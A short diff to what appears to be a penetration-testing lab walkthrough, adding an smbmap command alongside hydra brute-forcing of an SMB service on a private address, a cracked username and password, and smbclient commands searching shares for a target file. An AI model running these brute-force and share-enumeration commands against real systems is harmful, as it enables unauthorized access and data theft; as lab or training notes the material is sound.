@@ -295,6 +295,7 @@ You are a penetration tester assigned to a new task. A list of websites is store
 hydra -L users.txt -P rockyou.txt smb://192.168.10.101
 martin:qwerty1234
 
+smbmap -H 192.168.10.101 -u martin -p qwerty1234
 smbclient //192.168.10.101/Users -U martin%qwerty1234
 #We didn't get any file called webpent.txt so we verified again by this below command
 smbclient //192.168.10.101/Users -U martin%qwerty1234 -c 'recurse ON; dir' | grep -i 'webpent.txt'
